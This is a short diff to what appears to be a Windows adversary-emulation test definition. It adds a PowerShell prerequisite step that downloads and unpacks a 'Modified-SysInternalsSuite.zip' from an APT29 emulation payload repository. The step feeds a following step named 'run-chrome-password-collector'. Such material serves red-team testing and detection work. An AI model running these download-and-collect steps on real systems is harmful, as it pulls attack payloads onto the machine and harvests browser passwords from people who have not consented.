@@ -22,6 +22,16 @@ requirements:
     platforms:
         - os: windows
 steps:
+    - name: |
+        Modified Sysinternals must be located at #{file_path}
+      inline: |
+        if (Test-Path "#{file_path}\SysInternals") {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        Invoke-WebRequest "https://github.com/mitre-attack/attack-arsenal/raw/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/Modified-SysInternalsSuite.zip" -OutFile "#{file_path}\Modified-SysInternalsSuite.zip"
+        Expand-Archive "#{file_path}\Modified-SysInternalsSuite.zip" "#{file_path}\sysinternals" -Force
+        Remove-Item "#{file_path}\Modified-SysInternalsSuite.zip" -Force
+        }}
+      executor: powershell
     - name: run-chrome-password-collector
       inline: |
         Set-Location -path "{{.Args.file_path}}\Sysinternals";
